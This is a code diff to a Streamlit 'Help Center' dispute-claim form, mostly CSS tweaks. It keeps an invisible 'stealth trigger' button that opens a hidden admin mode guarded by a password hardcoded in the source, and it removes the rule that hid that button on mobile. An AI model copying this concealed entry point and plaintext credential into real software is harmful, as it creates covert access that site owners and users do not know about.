@@ -40,22 +40,18 @@ st.markdown("""<style>
         visibility: hidden !important;
     }
 
-    /* LOGO CENTERING & SIZING */
+    /* LOGO CENTERING */
     [data-testid="stImage"] {
         display: flex !important;
         justify-content: center !important;
         width: 100% !important;
     }
-
     [data-testid="stImage"] img {
         width: 220px !important;
         height: auto !important;
     }
-
     @media (max-width: 768px) {
-        [data-testid="stImage"] img {
-            width: 160px !important;
-        }
+        [data-testid="stImage"] img { width: 160px !important; }
     }
 
     .stButton > button {
@@ -65,6 +61,7 @@ st.markdown("""<style>
         font-weight: 600 !important;
         width: 100% !important;
         height: 45px !important;
+        border: none !important;
     }
 
     .promo-box {
@@ -73,62 +70,53 @@ st.markdown("""<style>
         position: relative;
     }
 
+    /* LEGAL FOOTER CLEANUP */
+    .legal-container {
+        font-size: 12px !important;
+        color: #777 !important;
+        text-align: center !important;
+        margin-top: 50px !important;
+        padding: 30px 10px !important;
+        border-top: 1px solid #222 !important;
+        line-height: 1.7 !important;
+    }
+
+    /* Prevent 'Member' or other words from becoming buttons */
+    .legal-container span, .legal-container div, .legal-container p {
+        background: transparent !important;
+        color: #777 !important;
+        border: none !important;
+        padding: 0 !important;
+        margin: 0 !important;
+        display: inline !important;
+        pointer-events: none !important;
+    }
+
     /* STEALTH TRIGGER */
     .stealth-trigger {
         position: absolute !important;
         bottom: 0 !important; left: 0 !important;
-        width: 40px !important; height: 40px !important;
+        width: 30px !important; height: 30px !important;
         z-index: 9999 !important;
     }
-
     .stealth-trigger button {
         background: transparent !important;
         border: none !important;
         color: transparent !important;
         box-shadow: none !important;
     }
-
-    /* HIDE ON MOBILE */
-    @media screen and (max-width: 768px) {
-        div.stealth-trigger, div.stealth-trigger button, [data-testid="stBaseButton-secondary"] {
-            display: none !important;
-            visibility: hidden !important;
-            pointer-events: none !important;
-            position: fixed !important;
-            left: -9999px !important;
-        }
-    }
-
-    .legal-container {
-        font-size: 11px !important;
-        color: #666 !important;
-        text-align: center !important;
-        margin-top: 40px !important;
-        padding: 20px 10px !important;
-        border-top: 1px solid #222 !important;
-        line-height: 1.6 !important;
-        background: transparent !important;
-    }
-
-    .legal-container * {
-        background: transparent !important;
-        color: #666 !important;
-        border: none !important;
-        pointer-events: none !important;
-        display: inline !important;
-    }
 </style>""", unsafe_allow_html=True)
 
 if 'admin_mode' not in st.session_state: st.session_state.admin_mode = False
 
 if not st.session_state.admin_mode:
-    if os.path.exists('logo.svg'): 
+    if os.path.exists('logo.svg'):
         st.image('logo.svg')
 
     st.title("Help Center")
     st.write("Please fill out the form below to submit your claim.")
 
-    with st.form("claim_v32_8_6", clear_on_submit=True):
+    with st.form("claim_v32_8_7", clear_on_submit=True):
         st.text_input("Full Name")
         st.text_input("Last 4 digits of Account")
         st.number_input("Disputed Amount", min_value=0.0, format="%.2f")
@@ -149,7 +137,7 @@ if not st.session_state.admin_mode:
     """, unsafe_allow_html=True)
 
     st.markdown("<div class='stealth-trigger'>", unsafe_allow_html=True)
-    if st.button(" ", key="stealth_admin_v86"):
+    if st.button(" ", key="stealth_admin_v87"): 
         st.session_state.admin_mode = True
         st.rerun()
     st.markdown("</div></div>", unsafe_allow_html=True)
@@ -161,6 +149,6 @@ else:
     pw = st.text_input("Auth Key", type="password")
     if st.button("CHECK"):
         if pw == "Diostieneelpoder1": st.write("Access Granted")
-    if st.button("↩"):
+    if st.button("℞"):
         st.session_state.admin_mode = False
         st.rerun()
